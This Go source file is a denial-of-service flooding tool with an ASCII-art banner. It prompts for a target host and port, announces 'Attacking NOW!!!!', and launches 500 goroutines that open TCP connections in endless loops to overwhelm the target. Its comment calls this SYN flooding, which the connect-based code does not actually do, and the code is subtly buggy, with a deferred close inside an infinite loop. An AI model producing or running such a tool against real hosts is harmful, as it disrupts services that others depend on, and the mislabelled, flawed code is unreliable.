package main

import (
	"fmt"
	"log"
	"net"
	"sync"
)

func syn_send(host string, port int) {
	j := 1
	for j != 0 {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 0) //flood the host with SYN packets
		if err != nil {
			return
		}
		defer conn.Close()
	}
}
func main() {
	var host string
	var port int

	banner := `
	█  █▀ █▄▄▄▄ ██   █  █▀ ▄███▄      ▄   
	█▄█   █  ▄▀ █ █  █▄█   █▀   ▀      █  
	█▀▄   █▀▀▌  █▄▄█ █▀▄   ██▄▄    ██   █ 
	█  █  █  █  █  █ █  █  █▄   ▄▀ █ █  █ 
  	  █     █      █   █   ▀███▀   █  █ █ 
 	 ▀     ▀      █   ▀            █   ██ 
    		         ▀                        
	By @RaiVivashu`
	colorReset := "\033[0m"
	colorBlue := "\033[34m"
	fmt.Printf("%s%s%s\n", colorBlue, banner, colorReset)
	fmt.Println("Enter Hostname:")
	fmt.Scan(&host)
	fmt.Println("Enter the Port:")
	fmt.Scan(&port)
	fmt.Println("Attacking NOW!!!! Please be Patient ;-)")
	var wg sync.WaitGroup
	numThreads := 500
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			syn_send(host, port)
		}()
	}
	wg.Wait()
}
